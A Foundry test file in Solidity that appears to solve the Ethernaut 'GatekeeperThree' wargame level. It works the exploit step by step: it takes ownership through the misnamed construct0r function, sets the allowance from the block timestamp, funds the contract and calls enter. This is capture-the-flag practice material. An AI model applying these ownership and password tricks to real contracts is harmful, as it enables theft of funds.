// SPDX-License-Identifier: MIT
pragma solidity >=0.8.0;

import "forge-std/Test.sol";

// Ditto both gatekeepers (checking tx.origin)
interface IFactory {
  function createInstance(address _player) external payable returns (address);
  function validateInstance(address payable _instance, address _player) external returns (bool);
}

interface IGatekeeperThree {
  function construct0r() external;
  function createTrick() external;
  function getAllowance(uint256) external;
  function enter() external returns (bool);
}

contract GatekeeperThreeTest is Test {
  IFactory internal challengeFactory;
  address internal challengeAddress;

  function setUp() public {
    challengeFactory = IFactory(0x762db91C67F7394606C8A636B5A55dbA411347c6);
    challengeAddress = challengeFactory.createInstance(tx.origin);
  }

  function testExploit() public {
    IGatekeeperThree gatekeeperThree = IGatekeeperThree(challengeAddress);

    gatekeeperThree.construct0r();

    gatekeeperThree.createTrick();
    gatekeeperThree.getAllowance(block.timestamp);

    (bool result,) = challengeAddress.call{value: 0.001000000000000001 ether}("");
    result;

    gatekeeperThree.enter();

    require(challengeFactory.validateInstance(payable(challengeAddress), tx.origin));
  }
}
